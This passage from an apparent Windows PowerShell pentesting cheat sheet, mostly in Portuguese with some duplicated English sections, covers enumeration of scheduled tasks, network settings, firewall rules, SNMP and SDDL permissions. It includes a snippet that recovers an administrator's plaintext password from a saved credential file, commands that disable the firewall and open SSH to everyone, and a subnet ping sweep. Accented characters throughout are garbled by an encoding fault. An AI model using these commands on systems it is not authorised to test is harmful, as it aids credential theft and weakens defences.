By using this technique, you can retrieve passwords from secure strings during your penetration testing activities. However, it's important to note that this method requires access to the secure string itself, so it may not always be applicable in all scenarios.
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## Tarefas Agendadas

Scheduled tasks are a powerful feature in Windows that allow you to automate the execution of scripts, commands, or programs at specific times or intervals. As a pentester, understanding how to manipulate and exploit scheduled tasks can be valuable for gaining persistence, privilege escalation, or executing malicious actions on a target system.

As tarefas agendadas s√£o um recurso poderoso no Windows que permite automatizar a execu√ß√£o de scripts, comandos ou programas em hor√°rios ou intervalos espec√≠ficos. Como um pentester, entender como manipular e explorar tarefas agendadas pode ser valioso para obter persist√™ncia, escalonamento de privil√©gios ou executar a√ß√µes maliciosas em um sistema alvo.

### Viewing Scheduled Tasks

To view the list of scheduled tasks on a Windows system, you can use the `Get-ScheduledTask` cmdlet in PowerShell. This cmdlet retrieves information about all the scheduled tasks on the local system or a remote system.

Para visualizar a lista de tarefas agendadas em um sistema Windows, voc√™ pode usar o cmdlet `Get-ScheduledTask` no PowerShell. Este cmdlet recupera informa√ß√µes sobre todas as tarefas agendadas no sistema local ou em um sistema remoto.

```powershell
Get-ScheduledTask
```

### Creating Scheduled Tasks

To create a new scheduled task, you can use the `New-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to specify the script, command, or program to be executed, as well as the schedule for the task.

Para criar uma nova tarefa agendada, voc√™ pode usar o cmdlet `New-ScheduledTask` no PowerShell. Este cmdlet permite especificar o script, comando ou programa a ser executado, bem como o agendamento da tarefa.

```powershell
New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "C:\path\to\script.ps1") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am)
```

### Modifying Scheduled Tasks

To modify an existing scheduled task, you can use the `Set-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to change various properties of the task, such as the script, command, or program to be executed, the schedule, or the user account under which the task runs.

Para modificar uma tarefa agendada existente, voc√™ pode usar o cmdlet `Set-ScheduledTask` no PowerShell. Este cmdlet permite alterar v√°rias propriedades da tarefa, como o script, comando ou programa a ser executado, o agendamento ou a conta de usu√°rio sob a qual a tarefa √© executada.

```powershell
Set-ScheduledTask -TaskPath "\MyTasks" -TaskName "MyTask" -Action (New-ScheduledTaskAction -Execute "C:\path\to\newscript.ps1")
```

### Deleting Scheduled Tasks

To delete a scheduled task, you can use the `Unregister-ScheduledTask` cmdlet in PowerShell. This cmdlet removes the specified task from the system.

Para excluir uma tarefa agendada, voc√™ pode usar o cmdlet `Unregister-ScheduledTask` no PowerShell. Este cmdlet remove a tarefa especificada do sistema.

```powershell
Unregister-ScheduledTask -TaskPath "\MyTasks" -TaskName "MyTask"
```

### Conclusion

Scheduled tasks are a fundamental component of Windows systems and can be leveraged by pentesters for various purposes. By understanding how to view, create, modify, and delete scheduled tasks using PowerShell, you can effectively manipulate and exploit this feature to achieve your objectives.
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
### Interfaces

As interfaces de rede s√£o componentes essenciais para a comunica√ß√£o de um sistema com a rede. No Windows, podemos usar o PowerShell para gerenciar e configurar as interfaces de rede.

#### Listar interfaces de rede

Para listar todas as interfaces de rede em um sistema Windows, podemos usar o seguinte comando PowerShell:

```powershell
Get-NetAdapter
```

Este comando ir√° exibir informa√ß√µes detalhadas sobre todas as interfaces de rede, como nome, descri√ß√£o, estado, endere√ßo MAC, velocidade, entre outros.

#### Habilitar ou desabilitar uma interface de rede

Podemos usar o PowerShell para habilitar ou desabilitar uma interface de rede espec√≠fica. Para isso, precisamos conhecer o nome da interface que queremos modificar.

Para desabilitar uma interface de rede, usamos o seguinte comando:

```powershell
Disable-NetAdapter -Name "Nome da Interface"
```

Para habilitar uma interface de rede, usamos o seguinte comando:

```powershell
Enable-NetAdapter -Name "Nome da Interface"
```

Substitua "Nome da Interface" pelo nome da interface de rede que voc√™ deseja habilitar ou desabilitar.

#### Configurar endere√ßo IP e DNS

Podemos usar o PowerShell para configurar o endere√ßo IP e os servidores DNS de uma interface de rede.

Para configurar o endere√ßo IP de uma interface de rede, usamos o seguinte comando:

```powershell
New-NetIPAddress -InterfaceAlias "Nome da Interface" -IPAddress "Endere√ßo IP" -PrefixLength "Comprimento do Prefixo"
```

Substitua "Nome da Interface" pelo nome da interface de rede que voc√™ deseja configurar, "Endere√ßo IP" pelo endere√ßo IP desejado e "Comprimento do Prefixo" pelo comprimento do prefixo da m√°scara de sub-rede.

Para configurar os servidores DNS de uma interface de rede, usamos o seguinte comando:

```powershell
Set-DnsClientServerAddress -InterfaceAlias "Nome da Interface" -ServerAddresses "Endere√ßo IP do Servidor DNS Prim√°rio", "Endere√ßo IP do Servidor DNS Secund√°rio"
```

Substitua "Nome da Interface" pelo nome da interface de rede que voc√™ deseja configurar e "Endere√ßo IP do Servidor DNS Prim√°rio" e "Endere√ßo IP do Servidor DNS Secund√°rio" pelos endere√ßos IP dos servidores DNS desejados.

#### Alterar o nome de uma interface de rede

Podemos usar o PowerShell para alterar o nome de uma interface de rede.

Para alterar o nome de uma interface de rede, usamos o seguinte comando:

```powershell
Rename-NetAdapter -Name "Nome da Interface" -NewName "Novo Nome da Interface"
```

Substitua "Nome da Interface" pelo nome atual da interface de rede que voc√™ deseja renomear e "Novo Nome da Interface" pelo novo nome desejado.
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Firewall

Um firewall √© uma medida de seguran√ßa essencial para proteger um sistema contra amea√ßas externas. Ele atua como uma barreira entre a rede interna e a internet, controlando o tr√°fego de entrada e sa√≠da com base em regras predefinidas.

No Windows, o firewall pode ser configurado usando o PowerShell. O PowerShell √© uma poderosa ferramenta de linha de comando e scripting que permite automatizar tarefas administrativas.

Aqui est√£o alguns comandos b√°sicos do PowerShell para configurar o firewall no Windows:

1. **Verificar o status do firewall:**

```powershell
Get-NetFirewallProfile
```

2. **Ativar o firewall:**

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

3. **Desativar o firewall:**

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

4. **Abrir uma porta espec√≠fica:**

```powershell
New-NetFirewallRule -DisplayName "Allow Port 80" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
```

5. **Bloquear uma porta espec√≠fica:**

```powershell
New-NetFirewallRule -DisplayName "Block Port 22" -Direction Inbound -LocalPort 22 -Protocol TCP -Action Block
```

Lembre-se de que a configura√ß√£o do firewall deve ser feita com cuidado, levando em considera√ß√£o as necessidades de seguran√ßa do sistema. √â importante entender as implica√ß√µes de cada regra antes de aplic√°-las.
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### Rota
```powershell
route print
```
### ARP

O Protocolo de Resolu√ß√£o de Endere√ßo (ARP) √© um protocolo de rede usado para associar um endere√ßo IP a um endere√ßo MAC em uma rede local. Ele permite que os dispositivos na mesma rede se comuniquem uns com os outros usando endere√ßos MAC.

O ARP funciona enviando uma solicita√ß√£o de ARP para descobrir o endere√ßo MAC correspondente a um determinado endere√ßo IP. O dispositivo de destino responde com seu endere√ßo MAC, permitindo que o dispositivo de origem estabele√ßa uma conex√£o direta.

Os hackers podem explorar o ARP para realizar ataques de envenenamento de cache ARP, onde eles falsificam as respostas de ARP para redirecionar o tr√°fego de rede para um dispositivo controlado por eles. Isso pode ser usado para interceptar dados sens√≠veis ou realizar ataques de nega√ß√£o de servi√ßo.

√â importante proteger sua rede contra ataques de ARP, implementando medidas de seguran√ßa, como a autentica√ß√£o de ARP, que verifica a autenticidade das respostas de ARP recebidas. Al√©m disso, √© recomendado monitorar regularmente o tr√°fego de ARP em sua rede para detectar atividades suspeitas.
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### Hosts

Os arquivos de hosts s√£o usados para mapear nomes de dom√≠nio para endere√ßos IP. Eles s√£o usados principalmente para bloquear ou redirecionar o tr√°fego de rede. No Windows, o arquivo de hosts est√° localizado em `C:\Windows\System32\drivers\etc\hosts`.

### Modificando o arquivo de hosts

Para modificar o arquivo de hosts, voc√™ pode usar o PowerShell. Aqui est√£o alguns comandos √∫teis:

- **Visualizar o conte√∫do do arquivo de hosts:**

```powershell
Get-Content C:\Windows\System32\drivers\etc\hosts
```

- **Adicionar uma entrada ao arquivo de hosts:**

```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "127.0.0.1 exemplo.com"
```

- **Remover uma entrada do arquivo de hosts:**

```powershell
(Get-Content C:\Windows\System32\drivers\etc\hosts) | Where-Object { $_ -notmatch "exemplo.com" } | Set-Content C:\Windows\System32\drivers\etc\hosts
```

Lembre-se de executar o PowerShell como administrador para poder modificar o arquivo de hosts.
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### Ping

O comando `ping` √© uma ferramenta comumente usada para testar a conectividade de rede entre um host local e um host remoto. Ele envia pacotes de dados para o host remoto e aguarda por uma resposta. O tempo que leva para receber uma resposta √© conhecido como lat√™ncia. O comando `ping` √© amplamente utilizado por pentesters para verificar a disponibilidade de um host e identificar poss√≠veis problemas de rede.

#### Sintaxe

```
ping <host>
```

#### Exemplo

```
ping www.example.com
```

Neste exemplo, o comando `ping` √© usado para testar a conectividade com o host `www.example.com`. O resultado mostrar√° o tempo de resposta e a taxa de perda de pacotes, se houver.

O comando `ping` √© uma ferramenta simples, mas √∫til, que pode fornecer informa√ß√µes valiosas durante um teste de penetra√ß√£o.
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

O Simple Network Management Protocol (SNMP) √© um protocolo amplamente utilizado para gerenciamento de redes. Ele permite que os dispositivos de rede sejam monitorados e controlados de forma centralizada. O SNMP opera em uma arquitetura cliente-servidor, onde os dispositivos de rede s√£o os agentes SNMP e o sistema de gerenciamento de rede √© o gerente SNMP.

O SNMP usa mensagens para trocar informa√ß√µes entre os agentes SNMP e o gerente SNMP. Essas mensagens s√£o chamadas de Protocol Data Units (PDUs). Existem diferentes tipos de PDUs, como GetRequest, GetNextRequest, SetRequest, entre outros, que s√£o usados para solicitar informa√ß√µes dos agentes SNMP ou para configurar os agentes SNMP.

Os agentes SNMP mant√™m uma estrutura de dados chamada Management Information Base (MIB), que cont√©m informa√ß√µes sobre o dispositivo de rede, como status, configura√ß√µes e estat√≠sticas. O gerente SNMP pode consultar a MIB dos agentes SNMP para obter informa√ß√µes sobre o dispositivo de rede.

Os pentesters podem usar o SNMP para obter informa√ß√µes valiosas sobre a rede alvo, como topologia da rede, dispositivos conectados, configura√ß√µes de seguran√ßa e muito mais. Eles tamb√©m podem explorar vulnerabilidades no SNMP para obter acesso n√£o autorizado aos dispositivos de rede ou para realizar ataques de nega√ß√£o de servi√ßo.

√â importante ressaltar que o uso do SNMP em um ambiente de produ√ß√£o deve ser feito com cuidado, pois configura√ß√µes inadequadas podem levar a vazamentos de informa√ß√µes sens√≠veis ou a comprometimento da seguran√ßa da rede. Portanto, √© recomend√°vel que os administradores de rede implementem medidas de seguran√ßa adequadas, como autentica√ß√£o e criptografia, para proteger o SNMP contra ataques.
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **Convertendo a String SDDL em um Formato Leg√≠vel**

Ao realizar testes de penetra√ß√£o em sistemas Windows, √© comum encontrar permiss√µes definidas em formato SDDL (Security Descriptor Definition Language). Essas permiss√µes podem ser dif√≠ceis de entender e analisar diretamente. Felizmente, o PowerShell fornece uma maneira f√°cil de converter a string SDDL em um formato leg√≠vel.

Para converter a string SDDL em um formato leg√≠vel, voc√™ pode usar o cmdlet `ConvertFrom-SddlString`. Este cmdlet converte a string SDDL em um objeto de seguran√ßa do PowerShell, que pode ser facilmente manipulado e analisado.

Aqui est√° um exemplo de como usar o cmdlet `ConvertFrom-SddlString`:

```powershell
$sddlString = "O:BAG:BAD:(A;;0x1;;;S-1-5-32-544)(A;;0x1;;;S-1-5-18)"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

Neste exemplo, a vari√°vel `$sddlString` cont√©m a string SDDL que desejamos converter. Em seguida, usamos o cmdlet `ConvertFrom-SddlString` para converter a string em um objeto de seguran√ßa do PowerShell. Por fim, exibimos o objeto de seguran√ßa resultante.

Ao executar o c√≥digo acima, voc√™ ver√° o objeto de seguran√ßa convertido, que mostra as permiss√µes em um formato mais leg√≠vel.

A convers√£o da string SDDL em um formato leg√≠vel pode ser √∫til ao analisar as permiss√µes de um sistema Windows durante um teste de penetra√ß√£o. Isso permite que voc√™ compreenda melhor as permiss√µes concedidas a diferentes usu√°rios e grupos, facilitando a identifica√ß√£o de poss√≠veis vulnerabilidades de seguran√ßa.
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Propriet√°rio: BUILTIN\Administrators
Grupo: BUILTIN\Administrators
